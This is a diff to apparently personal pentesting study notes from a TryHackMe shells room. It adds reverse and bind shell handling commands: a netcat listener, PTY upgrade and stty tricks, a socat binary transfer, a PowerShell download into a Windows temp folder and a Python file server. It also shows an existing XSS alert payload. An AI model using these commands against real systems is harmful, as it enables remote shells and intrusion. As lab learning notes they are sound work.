@@ -507,6 +507,11 @@ it was not working in a file
 * <img src="blah" ONERROR=alert('H'+'ello') />
 * https://beefproject.com/
 * XSS-Payloads.com
+
+## Shells
+
+--- https://tryhackme.com/room/introtoshells
+
 * send us command line access to the server (a reverse shell)
 * open up a port on the server which we can connect to in order to execute further commands (a bind shell). May be blocked by firewalls.
 * xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:ip /u:u /p:pass
@@ -518,3 +523,14 @@ it was not working in a file
 * In bind, the hacker is creating a server on the local machine.
 * we can't run interactive command (requiring user input)
 * `sudo rlwrap nc -lvnp 443`
+* `python -c 'import pty;pty.spawn("/bin/bash")'`
+* `export TERM=xterm` (give commands such as clear???)
+* CTRL+Z then `stty raw -echo; fg`
+* `reset` on finished
+* sudo apt install rlwrap give us the basics aside the CTRL+C handler above
+* Socat: transfer the socat binary https://github.com/andrew-d/static-binaries
+* `Invoke-WebRequest -uri <LOCAL-IP>/file -outfile C:\\Windows\temp\file`
+* Change terminal size
+  * `stty -a` in another terminal to find the value you want
+  * stty rows <number> / stty cols <number>
+* `sudp python3 -m http.server 80`
